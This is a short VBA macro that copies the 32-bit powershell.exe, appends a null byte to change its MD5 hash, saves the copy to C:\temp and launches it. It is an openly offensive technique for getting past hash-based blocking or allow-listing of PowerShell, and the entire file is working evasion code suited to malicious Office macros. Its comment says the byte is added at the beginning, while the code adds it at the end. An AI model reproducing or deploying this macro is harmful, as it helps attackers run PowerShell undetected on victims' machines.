Sub AddNull()

    ' Macro that takes a program (powershell.exe) and adds a nullbyte to the beginning to change the checksum
    ' Author: PovlTekstTV

    'Variables
    Dim Filename As String
    Dim Bytearray() As Byte
    Filename = "C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe"

    'Create ADODB object
    Dim bin
    Set bin = CreateObject("ADODB.Stream")
    bin.Type = 1
    bin.Open
    'Read the .exe as a Bytearray
    bin.LoadFromFile Filename
    Bytearray = bin.Read
    
    'Close the stream for now
    bin.Close
    
    'Change the Bytearray (and MD5 sum) by adding a null byte
    Dim Arraylength As Long 'Count the array
    Arraylength = UBound(Bytearray, 1) - LBound(Bytearray, 1) + 1 'stretch the array by 1
    ReDim Preserve Bytearray(Arraylength)
    Bytearray(Arraylength) = 0 'add null byte
    
    'Write a new .exe file
    bin.Open
    bin.Write Bytearray
    Dim newFilename As String
    newFilename = "C:\\temp\\powershell1.exe"
    bin.SaveToFile newFilename, 2

    Set WSHELL = CreateObject("Wscript.Shell")
    WSHELL.Run ("C:\\temp\\powershell1.exe")

End Sub
